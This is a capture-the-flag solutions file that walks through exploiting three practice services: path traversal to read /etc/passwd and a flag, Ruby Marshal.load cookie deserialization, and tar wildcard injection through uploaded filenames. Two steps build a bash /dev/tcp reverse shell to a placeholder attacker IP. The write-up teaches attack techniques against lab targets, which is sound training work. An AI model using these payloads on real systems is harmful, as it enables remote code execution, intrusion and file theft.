# Solutions - intended exploit walkthroughs

Spoilers :)

---

## burrow1 - Burrow Library (path traversal / LFI, Easy)

TLDR: Unsanitized query param that returns the output of any file

**Steps**

1. Browse to `http://<host>:8001/`. Note documents are served from
   `/view?file=<name>`.
2. Confirm the parameter is a raw path by escaping the docs directory, e.g.
   read `/etc/passwd`:

   ```bash
   curl 'http://<host>:8001/view?file=../../../../etc/passwd'
   ```

3. Read the flag directly (traversal or an absolute path both work):

   ```bash
   curl 'http://<host>:8001/view?file=../../../../home/burrow/flag.txt'
   # or
   curl 'http://<host>:8001/view?file=/home/burrow/flag.txt'
   ```

---

## burrow2 - Warren Lounge (insecure deserialization / Ruby `Marshal.load` RCE, Medium)

TLDR: `Marshal.load` is inherently a vulnerable function. We can inject RCE into the `prefs`
cookie by using the code at `/debug/source` as reference

**Steps**

1. Browse to `http://<host>:8002/`. You'll be presented with a preferences page that
   sets a base64 `prefs` cookie. Note the hint toward `/debug/source`.
2. Read the exposed source:

   ```bash
   curl 'http://<host>:8002/debug/source'
   ```

   You should see a few lines of code that run `Marshal.load` on the attacker-controlled
   `prefs` cookie and the `marshal_load` hook that runs `state[:hook]`.

3. Build a malicious `prefs` blob

   ```ruby
   # payload.rb
   require 'base64'
   class Preferences
     def marshal_dump
       { theme: 'dark', motd: 'pwned',
         hook: "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" }
     end
   end
   puts Base64.strict_encode64(Marshal.dump(Preferences.new))
   ```

   ```bash
   ruby payload.rb    # prints the base64 prefs blob
   ```

4. Start a listener, then send the blob as the `prefs` cookie:

   ```bash
   nc -lvnp 4444
   curl -b "prefs=<base64-blob>" 'http://<host>:8002/'
   ```

5. Catch the shell (it runs as `burrow`) and read the flag!

   ```bash
   cat /home/burrow/flag.txt
   ```

**Note**: It's obviously possible to do this without a reverse shell, but where's the fun in that :P

---

## burrow3 - Burrow Backup (tar wildcard injection, Hard)

TLDR: The "Back up my uploads" button runs `tar czf ... *` in the upload dir.
GNU tar treats option-looking filenames as options, so an uploaded file named
`--checkpoint-action=exec=sh x.sh` makes tar execute a script we also uploaded -
RCE as `burrow`.

There are actually two solutions for this CTF. The first is spinning up a reverse
shell using netcat (el clásico), and the second is using the attacker controlled
script to copy the flag into the backup itself, then downloading that.

**Steps**

1. Browse to `http://<host>:8003/`. Note the upload form, the "Back up my uploads"
   button, and the file listing (how you confirm your filenames survived).

2. On your machine, create the payload script `x.sh`:

   ```bash
   # Path A (reverse shell):
   echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" > x.sh

   # Path B (no listener):
   echo 'cp /home/burrow/flag.txt big-loot.txt' > x.sh
   ```

   Then the two option-named files (they can be empty, since the name is what's important):

   ```bash
   touch -- '--checkpoint=1'
   touch -- '--checkpoint-action=exec=sh x.sh'
   ```

   > `touch --` allows the leading `--` in the filename

3. Upload all three via the form

   This is what the backup will run in your session dir:

   ```bash
   tar czf /app/backups/<session>.tgz --checkpoint-action=exec=sh x.sh --checkpoint=1 x.sh notes.txt
   ```

   > **NOTE**: If you paste that exact command into a terminal, the shell will split the arguments on spaces,
   > which splits the `checkpoint-action` argument into two. The whole reason this actually works is that
   > glob expansion (the `*` the server uses) does not undergo word splitting, so the filename is passed,
   > space and all, as a single argument to tar. This is the heart of the exploit. Pretty neat!

4. Click **Back up my uploads**. tar globs your dir, hits the checkpoint options, and
   runs `sh x.sh` as `burrow`.

   - **Path A:** start `nc -lvnp 4444` first, then click Back up; catch the shell and
     `cat /home/burrow/flag.txt`. (Local testing: use `host.docker.internal` for the IP.)
   - **Path B:** click Back up a **second time** (the first run creates `big-loot.txt`,
     but tar already fixed its file list), then use the **Download latest backup** link:

     ```bash
     tar xf backup.tgz -O big-loot.txt
     ```
